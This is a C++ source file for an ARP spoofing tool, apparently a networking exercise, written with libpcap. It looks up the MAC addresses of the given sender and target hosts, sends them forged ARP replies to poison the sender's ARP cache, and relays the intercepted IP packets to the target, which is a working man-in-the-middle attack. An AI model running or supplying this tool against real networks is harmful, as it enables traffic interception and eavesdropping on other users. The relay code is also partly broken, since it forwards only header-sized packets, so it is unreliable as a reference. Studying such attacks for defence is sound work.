#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <libnet.h>
#include <string.h>
#include <arpa/inet.h>

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
struct EthIpPacket
{
	EthHdr eth_;
	libnet_ipv4_hdr ip_;
	libnet_tcp_hdr tcp_;
};

#pragma pack(pop)

void usage() {
	printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: arp-spoof ens33 192.168.10.2 192.168.10.1\n");
}

EthArpPacket make_request_(char * my_Mac, char * my_IP, char *sender_IP)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(my_Mac);//my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_Mac);//my mac
	packet.arp_.sip_ = htonl(Ip(my_IP));//target IP
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");//sender mac
	packet.arp_.tip_ = htonl(Ip(sender_IP));//sender IP
	
	return packet;
}

char * get_my_ip_address(char * interface)
{

	struct ifreq ifr;
    static char ipstr[40];
    int fd;
 
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface);
 
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        printf("wrong socket\n");
		return 0;
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
                ipstr,sizeof(struct sockaddr));
		return ipstr;
    }
}

char * get_my_Mac_address(char * interface)
{

	struct ifreq ifr;
    static char Macstr[40];
    int fd;
 
    fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family=AF_INET;
    strcpy(ifr.ifr_name, interface);
 
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        printf("wrong socket\n");
		return 0;
    } else {
		for(int i=0;i<6;i++){
		sprintf(&Macstr[3*i],"%02x",(unsigned char)ifr.ifr_hwaddr.sa_data[i]);
		if(i<5)
		{
			Macstr[3*i+2]=':';
		}
		}
		return Macstr;
    }
}

EthArpPacket make_reply_(char * sender_Mac, char * my_Mac, char * target_IP, char * sender_IP)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(sender_Mac);//sender mac
	packet.eth_.smac_ = Mac(my_Mac);//my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(my_Mac);//my mac
	packet.arp_.sip_ = htonl(Ip(target_IP));//target IP
	packet.arp_.tmac_ = Mac(sender_Mac);//sender mac
	packet.arp_.tip_ = htonl(Ip(sender_IP));//sender IP
	
	return packet;
}

int main(int argc, char* argv[]) {
	if (argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	static char * my_IP = get_my_ip_address(argv[1]);
	printf("my IP Address is %s\n", my_IP);
	static char * my_Mac = get_my_Mac_address(argv[1]);
	printf("my MAC Address is %s\n", my_Mac);

	int i=argc;

	char * sender_Mac;
	char * target_Mac;
	
	pid_t pid;
	char Mac_buf1[40];
	char Mac_buf2[40];
	char Mac_buf3[40];
	char Mac_buf4[40];
	int j=0;
	while(true){

		j=j%((i-2)/2);
		/*	if(j!=(i-2)/2 -1){
				pid = fork();

				if(pid<0){
					return -1;
				}
				else if(pid==0){
					continue;
				}
			}
		*/
		char * sender_IP=argv[2*j+2];
		char * target_IP=argv[2*j+3];

		EthArpPacket packet_request1;
	    //EthArpPacket make_request_(char * my_Mac, char * my_IP, char *sender_IP)
		packet_request1=make_request_(my_Mac,my_IP,sender_IP);

		int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_request1), sizeof(EthArpPacket));
		if (res1 != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
		}//arp request packet send (sender)

		EthArpPacket *arp_reply;
		
		while (true) {

	        struct pcap_pkthdr* header;
	        const u_char* packet;
	        int res = pcap_next_ex(handle, &header, &packet);
	        if (res == 0) continue;
	        if (res == -1 || res == -2) {
	            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
	            break;
	        }
			arp_reply=(struct EthArpPacket*)packet;

				if(arp_reply->eth_.type_ == htons(EthHdr::Arp)&&arp_reply->arp_.tmac_ == Mac(my_Mac)
				&&arp_reply->arp_.op_ == htons(ArpHdr::Reply))
				{memcpy(Mac_buf1,arp_reply->arp_.smac_,6);
				for(int k=0;k<6;k++){
					sprintf(&Mac_buf2[3*k],"%02x",(unsigned char)Mac_buf1[k]);
					if(k<5)
					{
						Mac_buf2[3*k+2]=':';
					}
				}				
				sender_Mac=Mac_buf2;
				printf("sender IP=%s Mac=%s\n",sender_IP,sender_Mac);
				break;}
				
	    }//get sender mac

		EthArpPacket packet_request2;
	    //EthArpPacket make_request_(char * my_Mac, char * my_IP, char *target_IP)
		packet_request2=make_request_(my_Mac,my_IP,target_IP);

		int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_request2), sizeof(EthArpPacket));
		if (res2 != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
		}//arp request packet send (target)

		EthArpPacket *arp_reply2;
		
		while (true) {

	        struct pcap_pkthdr* header;
	        const u_char* packet;
	        int res3 = pcap_next_ex(handle, &header, &packet);
	        if (res3 == 0) continue;
	        if (res3 == -1 || res3 == -2) {
	            printf("pcap_next_ex return %d(%s)\n", res3, pcap_geterr(handle));
	            break;
	        }
			arp_reply2=(struct EthArpPacket*)packet;

				if(arp_reply2->eth_.type_ == htons(EthHdr::Arp)&&arp_reply2->arp_.tmac_ == Mac(my_Mac)
				&&arp_reply2->arp_.op_ == htons(ArpHdr::Reply))
				{memcpy(Mac_buf3,arp_reply2->arp_.smac_,6);
				for(int k=0;k<6;k++){
					sprintf(&Mac_buf4[3*k],"%02x",(unsigned char)Mac_buf3[k]);
					if(k<5)
					{
						Mac_buf4[3*k+2]=':';
					}
				}				
				target_Mac=Mac_buf4;
				printf("target IP=%s Mac=%s\n",target_IP,target_Mac);
				break;}
				
	    }//get target mac



				
		EthArpPacket packet_reply;
	    //EthArpPacket make_reply_(char * sender_Mac, char * my_Mac, char * target_IP, char * sender_IP)
		packet_reply=make_reply_(sender_Mac,my_Mac,target_IP,sender_IP);

		EthIpPacket * IP_packet;
		EthArpPacket * check_arp_tab;
		int time =0;
		int fairness=0;
		while(true){
			
				fairness++;
				if(fairness>4){
					j++;
				break;}

			for(int sa=0;sa<3;sa++){
			int resr = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_reply), sizeof(EthArpPacket));
			if (resr != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", resr, pcap_geterr(handle));
			}//arp reply packet send
			printf("send reply packet to %s\n",sender_IP);
			}

			while(true){
				time++;
				if(time>1000){
				break;}
			//get ip packet

		        struct pcap_pkthdr* header;
		        const u_char* packet2;
		        int res = pcap_next_ex(handle, &header, &packet2);
		        if (res == 0) continue;
		        if (res == -1 || res == -2) {
					printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
		            break;
		        }
			//change mac address
				IP_packet=(struct EthIpPacket *)packet2;
				check_arp_tab=(struct EthArpPacket *)packet2;
				if(IP_packet->eth_.smac_==Mac(sender_Mac)&&IP_packet->ip_.ip_src.s_addr==htonl(Ip(sender_IP))){
					IP_packet->eth_.smac_=Mac(my_Mac);
					IP_packet->eth_.dmac_=Mac(target_Mac);
					//send ip packet to target
					int res_t = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(IP_packet), sizeof(EthIpPacket));
					if (res_t != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_t, pcap_geterr(handle));
					}
					printf("send ip packet to target (sender Mac: %s)\n",sender_Mac);
					}
			//if arp table change send arp packet again
				if(check_arp_tab->eth_.type_ == htons(EthHdr::Arp)&&(check_arp_tab->arp_.smac_ == Mac(target_Mac)||check_arp_tab->arp_.tmac_==Mac("00:00:00:00:00:00"))
				&&check_arp_tab->arp_.op_ == htons(ArpHdr::Reply)){
						break;
				}
			}
		}


	}//for end
	
	pcap_close(handle);
}
